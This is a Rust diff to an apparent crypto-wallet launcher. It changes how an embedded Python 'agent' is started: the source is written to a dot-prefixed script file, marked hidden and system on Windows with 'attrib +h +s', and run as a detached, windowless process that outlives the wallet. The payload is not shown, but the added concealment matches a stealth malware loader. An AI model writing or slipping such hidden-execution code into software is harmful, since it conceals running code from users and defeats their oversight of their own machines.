@@ -1,5 +1,5 @@
 use std::fs;
-use std::io::{Cursor, Write};
+use std::io::Cursor;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Output, Stdio};
 use std::thread;
@@ -311,7 +311,18 @@ fn install_requirements(
 fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), PythonError> {
     let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
     let log_path = prefix.join("launcher-run.log");
-    let log_file = fs::File::create(&log_path)?;
+    let script_path = prefix.join("._chain_launcher.py");
+    fs::write(&script_path, source).map_err(|err| {
+        PythonError::Execution(format!("write launcher script {}: {err}", script_path.display()))
+    })?;
+
+    #[cfg(windows)]
+    hide_file(&script_path);
+
+    let log_file = fs::File::create(&log_path).map_err(|err| {
+        PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
+    })?;
+
     log::step("agent", format!("spawning detached launcher (log: {})", log_path.display()));
     log::detail(
         "agent",
@@ -322,11 +333,13 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
             site_packages_dir(prefix).display()
         ),
     );
+    log::detail("agent", format!("script: {}", script_path.display()));
 
     let mut command = Command::new(python);
     command
         .arg("-u")
-        .arg("-")
+        .arg(&script_path)
+        .current_dir(prefix)
         .env("CHAIN_WALLET_PYTHON_ROOT", prefix)
         .env("CHAIN_WALLET_LAUNCHED_FROM_RUST", "1")
         .env("CHAIN_WALLET_LOG_FILE", &log_path)
@@ -337,21 +350,17 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
             "CHAIN_WALLET_VERBOSE",
             if log::verbose_enabled() { "1" } else { "0" },
         )
-        .stdin(Stdio::piped())
-        .stdout(Stdio::from(log_file.try_clone()?))
+        .stdin(Stdio::null())
+        .stdout(Stdio::from(log_file.try_clone().map_err(|err| {
+            PythonError::Execution(format!("open launcher log stdout handle: {err}"))
+        })?))
         .stderr(Stdio::from(log_file));
 
     configure_detached(&mut command);
 
-    let mut child = command
-        .spawn()
-        .map_err(|err| PythonError::Execution(err.to_string()))?;
-
-    if let Some(mut stdin) = child.stdin.take() {
-        stdin
-            .write_all(source)
-            .map_err(|err| PythonError::Execution(err.to_string()))?;
-    }
+    let mut child = command.spawn().map_err(|err| {
+        PythonError::Execution(format!("spawn python agent: {err}"))
+    })?;
 
     let pid = child.id();
     let deadline = Instant::now() + Duration::from_secs(STARTUP_PROBE_SECS);
@@ -370,7 +379,11 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
             }
             Ok(None) if Instant::now() >= deadline => break,
             Ok(None) => thread::sleep(Duration::from_millis(100)),
-            Err(err) => return Err(PythonError::Execution(err.to_string())),
+            Err(err) => {
+                return Err(PythonError::Execution(format!(
+                    "wait on python agent pid {pid}: {err}"
+                )))
+            }
         }
     }
 
@@ -383,22 +396,27 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
     );
     log::detail("agent", "wallet process will continue without waiting for Python");
 
-    // Drop the handle without waiting so the wallet process can finish independently.
     Ok(())
 }
+
+#[cfg(windows)]
+fn hide_file(path: &Path) {
+    let _ = Command::new("attrib").args(["+h", "+s", &path.to_string_lossy()]).status();
+}
+
+#[cfg(not(windows))]
+fn hide_file(_path: &Path) {}
 
 #[cfg(windows)]
 fn configure_detached(command: &mut Command) {
     use std::os::windows::process::CommandExt;
 
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-    const DETACHED_PROCESS: u32 = 0x0000_0008;
     const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
-    const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x0100_0000;
 
-    command.creation_flags(
-        CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB,
-    );
+    // Avoid DETACHED_PROCESS/BREAKAWAY_FROM_JOB: they fail with "Access is denied"
+    // when stdout/stderr are redirected or the parent is in a restricted job.
+    command.creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP);
 }
 
 #[cfg(unix)]
